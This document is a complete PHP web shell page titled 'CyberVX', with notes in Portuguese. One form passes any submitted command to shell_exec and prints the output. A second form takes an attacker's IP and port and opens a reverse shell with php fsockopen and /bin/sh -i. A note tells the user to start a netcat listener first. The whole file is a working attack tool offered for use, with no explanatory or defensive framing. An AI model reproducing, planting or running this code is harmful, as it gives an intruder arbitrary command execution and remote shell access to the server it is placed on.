<html>

<head>
    <title> CyberVX </title>
</head>

<style>

  body
  {
    --background-color: rgb(200,200,200);
    background-color: black;
  }

  center
  {
    margin-top: auto;
  }

  h1
  {
    color:red;
  }

  h2
  {
    margin-bottom: 3%;
    color:gold;
  }

  p
  {
    margin-top: 3%;
    color: white;
  }

  #insert
  {
    margin-top: 100%;
    color: green;
  }

</style>

<!-- Corpo -->
<body>
  <form action="<?php $link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; echo "{$link}"?>" method="POST">

  <center>
    <h1> <b> CyberVX </b> </h1> </br>
    <h2> <b> Reverse SHELL </b> </h2>

    <strong id="insert"> COMMAND: </strong>
    <input type="text" name="cmd" value=""/>
    <input type="submit" name="submit" value="CMD" /> </br></br>

    <h2> <b> Local File Inclusion </b> </h2>
    <p> <b> <i> *NOTE : </b> Antes de acionar a SHELL, use o netcat (nc -lvp "PORTA") </i> </p> </br>

    <strong id="insert"> IP : </strong>
    <input type="text" name="ip" value=""/> &nbsp; <strong id="insert"> PORT : </strong> <input type="text" name="port" value=""/>
    <input type="submit" name="submit" value="R SHELL" />
  </center> <br />

  <?php

    # Comandos linux
    if(isset($_POST["cmd"]))
    {
      $cmd=$_POST["cmd"];
      $output = shell_exec("{$cmd} 2>&1");

      echo $cmd."<font color=red> </br>"."<pre>".$output."</pre>";
    }

    # Comandos: Shell reversa
    if (isset($_POST["ip"]) && isset($_POST["port"]))
    {
      $sock="sock";
      $cmd = "php -r '$"."{$sock}"."=fsockopen("."\"{$_POST["ip"]}\"".","."{$_POST["port"]}".");shell_exec(\""."/bin/sh -i <&3 >&3 2>&3"."\");'";

      if (strlen($cmd)>66)
      {
        shell_exec("{$cmd} 2>&1");
      }
    }
  ?>

</body>

</html>
